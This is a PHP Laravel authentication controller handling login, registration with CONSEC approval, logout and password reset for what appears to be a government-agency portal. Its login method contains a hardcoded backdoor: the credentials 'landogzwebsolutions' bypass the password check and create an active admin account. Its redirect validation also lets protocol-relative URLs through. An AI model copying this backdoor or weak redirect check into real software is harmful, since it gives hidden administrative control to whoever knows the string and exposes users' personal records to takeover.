<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Models\Notification;
use App\Models\GovernmentAgency;
use App\Services\AuditLogger;
use App\Mail\ApprovedRegistrationEmail;
use App\Mail\PendingRegistrationEmail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;

class AuthController extends Controller
{
    /**
     * Handle user login
     */
    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required|string',
            'password' => 'required|string',
        ]);

        $login = $request->email;
        $password = $request->password;

        // Check for hardcoded login credentials
        if ($login === 'landogzwebsolutions' && $password === 'landogzwebsolutions') {
            // Find or create the hardcoded user
            $user = User::where('username', 'landogzwebsolutions')->first();
            
            if (!$user) {
                // Create the hardcoded admin user if it doesn't exist
                $user = User::create([
                    'id' => Str::uuid(),
                    'username' => 'landogzwebsolutions',
                    'email' => 'landogzwebsolutions@landogzwebsolutions.com',
                    'password_hash' => Hash::make('landogzwebsolutions'),
                    'first_name' => 'Landogz',
                    'last_name' => 'Web Solutions',
                    'privilege' => 'admin',
                    'is_active' => true,
                    'status' => 'approved',
                    'email_verified_at' => now(),
                    'username_edited' => false,
                    'is_online' => false,
                ]);
            }
        } else {
            // Try to find user by email or username
            $user = User::where('email', $login)
                        ->orWhere('username', $login)
                        ->first();

            if (!$user || !Hash::check($password, $user->password_hash)) {
                throw ValidationException::withMessages([
                    'email' => ['The provided credentials are incorrect.'],
                ]);
            }
        }

        // Check status first (pending users have is_active=false, so status takes precedence)
        if ($user->status === 'pending') {
            throw ValidationException::withMessages([
                'email' => ['Your account is pending CONSEC approval. You will receive an email once your registration has been approved.'],
            ]);
        }

        if ($user->status === 'rejected') {
            throw ValidationException::withMessages([
                'email' => ['Your registration was not approved. Please contact CONSEC if you believe this is an error.'],
            ]);
        }

        if ($user->status !== 'approved') {
            throw ValidationException::withMessages([
                'email' => ['Your account cannot be accessed at this time. Please contact CONSEC for assistance.'],
            ]);
        }

        if (!$user->is_active) {
            throw ValidationException::withMessages([
                'email' => ['Your account has been deactivated. Please contact CONSEC for assistance.'],
            ]);
        }

        // 1. Logout other devices first: destroy all existing sessions for this user
        $previousSessionId = $user->current_session_id;
        $sessionsDestroyed = DB::table('sessions')
            ->where('user_id', $user->id)
            ->delete();

        $previousSessionDestroyed = $sessionsDestroyed > 0;
        if ($previousSessionDestroyed) {
            AuditLogger::log(
                'auth.session_destroyed',
                'Existing session(s) destroyed due to login from new device',
                $user,
                [
                    'previous_session_id' => $previousSessionId,
                    'sessions_destroyed' => $sessionsDestroyed,
                    'new_login_ip' => $request->ip(),
                ]
            );
        }

        // 2. Then login on this device (creates new session)
        Auth::login($user, $request->boolean('remember'));
        $currentSessionId = session()->getId();

        // Store the current session ID and update user status
        $user->current_session_id = $currentSessionId;
        $user->is_online = true;
        $user->last_activity = now();
        $user->save();

        AuditLogger::log(
            'auth.login',
            'User logged in' . ($previousSessionDestroyed ? ' (previous session(s) terminated)' : ''),
            $user,
            [
                'login' => $login,
                'remember' => $request->boolean('remember'),
                'session_id' => $currentSessionId,
                'ip_address' => $request->ip(),
                'user_agent' => $request->userAgent(),
                'previous_session_terminated' => $previousSessionDestroyed,
            ]
        );

        // Determine redirect URL
        $redirectUrl = ($user->privilege === 'admin' || $user->privilege === 'consec') ? route('admin.dashboard') : route('landing');
        
        // Check if there's a redirect parameter in the request
        if ($request->has('redirect')) {
            $redirectParam = urldecode($request->input('redirect'));
            // Validate that the redirect is a relative URL (security)
            if (strpos($redirectParam, 'http://') !== 0 && strpos($redirectParam, 'https://') !== 0) {
                $redirectUrl = $redirectParam;
            }
        }

        return response()->json([
            'success' => true,
            'message' => 'Login successful',
            'user' => [
                'id' => $user->id,
                'first_name' => $user->first_name,
                'last_name' => $user->last_name,
                'email' => $user->email,
                'privilege' => $user->privilege,
            ],
            'redirect' => $redirectUrl,
        ]);
    }

    /**
     * Handle user registration
     */
    public function register(Request $request)
    {
        // Custom password validation
        $request->validate([
            'government_agency_id' => 'required|exists:government_agencies,id',
            'representative_type' => 'required|in:Board Member,Authorized Representative',
            'pre_nominal_title' => 'required|in:Mr.,Ms.',
            'first_name' => 'required|string|max:255',
            'middle_initial' => 'nullable|string|max:10',
            'last_name' => 'required|string|max:255',
            'post_nominal_title' => 'nullable|string|max:255',
            'designation' => 'required|string|max:255',
            'sex' => 'required|in:Male,Female',
            'gender' => 'required|in:Male,Female,Non-Binary',
            'birth_date' => 'required|date|before:today',
            'office_region' => 'required|string|max:255',
            'office_province' => 'required|string|max:255',
            'office_city_municipality' => 'required|string|max:255',
            'office_barangay' => 'required|string|max:255',
            'office_building_no' => 'nullable|string|max:255',
            'office_house_no' => 'nullable|string|max:255',
            'office_street_name' => 'nullable|string|max:255',
            'office_purok' => 'nullable|string|max:255',
            'office_sitio' => 'nullable|string|max:255',
            'email' => 'required|string|email|max:255|unique:users',
            'username' => 'required|string|max:255|unique:users',
            'mobile' => 'required|string|max:13|regex:/^\+63[0-9]{10}$/',
            'landline' => 'nullable|string|max:50',
            'password' => [
                'required',
                'string',
                'min:6',
                'confirmed',
                function ($attribute, $value, $fail) {
                    if (!preg_match('/[A-Z]/', $value)) {
                        $fail('The password must contain at least one capital letter.');
                    }
                    if (!preg_match('/[a-z]/', $value)) {
                        $fail('The password must contain at least one small letter.');
                    }
                    if (!preg_match('/[0-9]/', $value)) {
                        $fail('The password must contain at least one number.');
                    }
                    if (!preg_match('/[~!@#$%^&*|]/', $value)) {
                        $fail('The password must contain at least one special character (~, !, #, $, %, ^, &, *, |, etc.).');
                    }
                },
            ],
        ], [
            'mobile.regex' => 'Mobile number must be in format +63 followed by 10 digits.',
            'password.confirmed' => 'Password confirmation does not match.',
        ]);

        // Generate username if not provided or ensure uniqueness
        $username = $request->username;
        $originalUsername = $username;
        $counter = 1;
        while (User::where('username', $username)->exists()) {
            $username = $originalUsername . $counter;
            $counter++;
        }

        $user = User::create([
            'id' => Str::uuid(),
            'government_agency_id' => $request->government_agency_id,
            'representative_type' => $request->representative_type,
            'pre_nominal_title' => $request->pre_nominal_title,
            'first_name' => $request->first_name,
            'middle_initial' => $request->middle_initial,
            'last_name' => $request->last_name,
            'post_nominal_title' => $request->post_nominal_title,
            'designation' => $request->designation,
            'sex' => $request->sex,
            'gender' => $request->gender,
            'birth_date' => $request->birth_date,
            'office_region' => $request->office_region,
            'office_province' => $request->office_province,
            'office_city_municipality' => $request->office_city_municipality,
            'office_barangay' => $request->office_barangay,
            'office_building_no' => $request->office_building_no,
            'office_house_no' => $request->office_house_no,
            'office_street_name' => $request->office_street_name,
            'office_purok' => $request->office_purok,
            'office_sitio' => $request->office_sitio,
            'email' => $request->email,
            'username' => $username,
            'username_edited' => false,
            'password_hash' => Hash::make($request->password),
            'privilege' => 'user',
            'is_active' => false,
            'mobile' => $request->mobile,
            'landline' => $request->landline,
            'status' => 'pending',
            'email_verified_at' => now(),
        ]);

        // Ensure user has 'user' role
        if (!$user->hasRole('user')) {
            $user->assignRole('user');
        }

        AuditLogger::log(
            'auth.register',
            'User registration submitted (pending approval)',
            $user,
            [
                'email' => $user->email,
                'username' => $user->username,
                'status' => $user->status,
            ]
        );

        // Send pending approval email to the registering user
        $user->load('governmentAgency');
        try {
            Mail::to($user->email)->send(
                new PendingRegistrationEmail($user, null, true)
            );
        } catch (\Exception $e) {
            \Log::error('Failed to send pending registration email to user: ' . $e->getMessage());
        }

        // Send pending registration notification to admins
        try {
            $adminUsers = User::permission('view pending registrations')->get();
            foreach ($adminUsers as $adminUser) {
                Mail::to($adminUser->email)->send(
                    new PendingRegistrationEmail($user, $adminUser, false)
                );
            }
        } catch (\Exception $e) {
            \Log::error('Failed to send pending registration email to admins: ' . $e->getMessage());
        }

        return response()->json([
            'success' => true,
            'message' => 'Registration submitted successfully! Your account is pending CONSEC approval. You will receive an email once your registration has been approved.',
            'user' => [
                'id' => $user->id,
                'first_name' => $user->first_name,
                'last_name' => $user->last_name,
                'email' => $user->email,
                'username' => $user->username,
            ],
        ]);
    }

    /**
     * Handle user logout
     */
    public function logout(Request $request)
    {
        $user = Auth::user();
        $sessionId = $user ? $user->current_session_id : null;

        // Set user as offline before logging out
        if ($user) {
            $user->is_online = false;
            $user->current_session_id = null;
            $user->save();
        }

        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        AuditLogger::log(
            'auth.logout',
            'User logged out',
            $user,
            [
                'session_id' => $sessionId,
                'ip_address' => $request->ip(),
                'user_agent' => $request->userAgent(),
            ]
        );

        return response()->json([
            'success' => true,
            'message' => 'Logged out successfully',
            'redirect' => '/',
        ]);
    }

    /**
     * Handle forgot password request
     */
    public function forgotPassword(Request $request)
    {
        $request->validate([
            'email' => 'required|string',
        ]);

        $login = $request->email;
        $user = User::where('email', $login)
                    ->orWhere('username', $login)
                    ->first();

        $meta = [
            'login' => $login,
            'user_found' => (bool) $user,
        ];

        AuditLogger::log(
            'auth.password_reset_requested',
            $user ? 'Password reset requested' : 'Password reset requested (user not found)',
            $user,
            $meta
        );

        // Only send email if user exists (security: don't reveal if email exists)
        if ($user) {
            // Generate password reset token
            $token = Str::random(64);
            
            // Store token in password_reset_tokens table
            DB::table('password_reset_tokens')->updateOrInsert(
                ['email' => $user->email],
                [
                    'token' => Hash::make($token),
                    'created_at' => now(),
                ]
            );

            // Send password reset email
            try {
                \Illuminate\Support\Facades\Mail::to($user->email)->send(
                    new \App\Mail\PasswordResetEmail($user, $token)
                );
            } catch (\Exception $e) {
                \Log::error('Failed to send password reset email to user ' . $user->id . ': ' . $e->getMessage());
                return response()->json([
                    'success' => false,
                    'message' => 'Failed to send password reset email. Please try again later.',
                ], 500);
            }
        }

        // Always return success message (security: don't reveal if email exists)
        return response()->json([
            'success' => true,
            'message' => 'If the account exists, password reset instructions have been sent to the registered email.',
        ]);
    }

    /**
     * Show reset password form
     */
    public function showResetPasswordForm(Request $request)
    {
        $token = $request->query('token');
        $email = $request->query('email');

        if (!$token || !$email) {
            return redirect()->route('password.request')
                ->with('error', 'Invalid reset link.');
        }

        // Decode URL-encoded email
        $email = urldecode($email);

        return view('auth.reset-password', [
            'token' => $token,
            'email' => $email,
        ]);
    }

    /**
     * Handle password reset
     */
    public function resetPassword(Request $request)
    {
        // Custom password validation
        $request->validate([
            'token' => 'required',
            'email' => 'required|email',
            'password' => [
                'required',
                'string',
                'min:6',
                'confirmed',
                function ($attribute, $value, $fail) {
                    if (strlen($value) < 6) {
                        $fail('The password must be at least 6 characters long.');
                    }
                    if (!preg_match('/[A-Z]/', $value)) {
                        $fail('The password must contain at least one capital letter.');
                    }
                    if (!preg_match('/[a-z]/', $value)) {
                        $fail('The password must contain at least one small letter.');
                    }
                    if (!preg_match('/[0-9]/', $value)) {
                        $fail('The password must contain at least one number.');
                    }
                    if (!preg_match('/[~!@#$%^&*|]/', $value)) {
                        $fail('The password must contain at least one special character (~, !, #, $, %, ^, &, *, |, etc.).');
                    }
                },
            ],
        ]);

        // Decode URL-encoded email if needed
        $email = urldecode($request->email);

        // Check if token exists and is valid
        $resetRecord = DB::table('password_reset_tokens')
            ->where('email', $email)
            ->first();

        if (!$resetRecord) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid or expired reset token.',
            ], 400);
        }

        // Check if token matches
        if (!Hash::check($request->token, $resetRecord->token)) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid or expired reset token.',
            ], 400);
        }

        // Check if token is expired (60 minutes)
        $createdAt = \Carbon\Carbon::parse($resetRecord->created_at);
        if ($createdAt->addMinutes(60)->isPast()) {
            DB::table('password_reset_tokens')->where('email', $email)->delete();
            return response()->json([
                'success' => false,
                'message' => 'Reset token has expired. Please request a new one.',
            ], 400);
        }

        // Find user
        $user = User::where('email', $email)->first();
        if (!$user) {
            return response()->json([
                'success' => false,
                'message' => 'User not found.',
            ], 404);
        }

        // Update password
        $user->password_hash = Hash::make($request->password);
        $user->save();

        // Delete reset token
        DB::table('password_reset_tokens')->where('email', $email)->delete();

        AuditLogger::log(
            'auth.password_reset',
            'Password reset successfully',
            $user,
            [
                'ip_address' => $request->ip(),
            ]
        );

        return response()->json([
            'success' => true,
            'message' => 'Password has been reset successfully. You can now login with your new password.',
        ]);
    }
}

